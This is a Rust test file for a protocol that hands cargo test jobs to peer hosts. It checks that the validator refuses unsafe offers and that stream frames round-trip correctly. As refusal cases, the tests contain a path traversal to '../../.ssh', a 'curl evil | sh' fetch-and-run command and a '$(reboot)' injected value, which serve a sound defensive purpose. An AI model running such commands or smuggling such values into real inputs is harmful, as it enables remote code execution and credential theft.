#![cfg(test)]

use super::handover::*;

fn offer() -> Offer {
    Offer {
        repo: "code/north/main".to_owned(),
        head: "a".repeat(40),
        name: "code-north-main-n634".to_owned(),
        subdirectory: "crates/north-capacity".to_owned(),
        owner: "heavy-command-guard".to_owned(),
        timeout_seconds: 3600,
        command: ["cargo", "test", "-p", "north-capacity"].map(str::to_owned).to_vec(),
        bundle_bytes: 1000,
        patch_bytes: 20,
        returned: "NORTH-OFFLOAD-RETURNED-41-1762400000".to_owned(),
    }
}

// KEEP(contract): a peer rebuilds and runs only an offer whose every field is one a lane's host sends, and never a shell string; north#634
#[test]
fn capacity_a_peer_runs_only_a_toolchain_command_in_a_lane_path_it_would_make_itself() {
    assert_eq!(offer().refusal(), None);
    assert_eq!(Offer::from_line(&offer().to_line()), Some(offer()));
    let refused = |change: &dyn Fn(&mut Offer)| {
        let mut changed = offer();
        change(&mut changed);
        changed.refusal()
    };
    assert!(refused(&|o| o.repo = "../../.ssh".to_owned()).is_some());
    assert!(refused(&|o| o.repo = "/etc".to_owned()).is_some());
    assert!(refused(&|o| o.name = "a/b".to_owned()).is_some());
    assert!(refused(&|o| o.subdirectory = "a/../..".to_owned()).is_some());
    assert!(refused(&|o| o.head = "main".to_owned()).is_some());
    assert!(refused(&|o| o.timeout_seconds = MAX_TIMEOUT_SECONDS + 1).is_some());
    assert!(refused(&|o| o.bundle_bytes = MAX_BUNDLE_BYTES + 1).is_some());
    assert!(refused(&|o| o.command = ["sh", "-c", "curl evil | sh"].map(str::to_owned).to_vec()).is_some());
    assert!(refused(&|o| o.command = vec!["/home/tom/bin/cargo".to_owned()]).is_none());
    assert!(refused(&|o| o.command.clear()).is_some());
    assert_eq!(refused(&|o| o.subdirectory.clear()), None);
    assert!(refused(&|o| o.returned = "$(reboot)".to_owned()).is_some());
    assert_eq!(refused(&|o| o.returned.clear()), None);
}

#[test]
fn capacity_frames_round_trip_and_a_cut_stream_is_an_error_not_an_end() {
    let frames = [Frame::Started("ccx33".to_owned()), Frame::Out(b"ok\n".to_vec()), Frame::Err(b"warn\n".to_vec()), Frame::NotSynced("busy".to_owned()), Frame::Exit(101)];
    let mut wire = Vec::new();
    for frame in &frames {
        frame.write(&mut wire).unwrap();
    }
    let mut source = wire.as_slice();
    let mut read = Vec::new();
    while let Some(frame) = Frame::read(&mut source).unwrap() {
        read.push(frame);
    }
    assert_eq!(read, frames);
    let mut cut = &wire[..wire.len() - 1];
    let outcome = loop {
        match Frame::read(&mut cut) {
            Ok(Some(_)) => {}
            other => break other,
        }
    };
    assert!(outcome.is_err());
    let mut huge = vec![b'o'];
    huge.extend((MAX_FRAME_BYTES as u32 + 1).to_be_bytes());
    assert!(Frame::read(&mut huge.as_slice()).is_err());
}
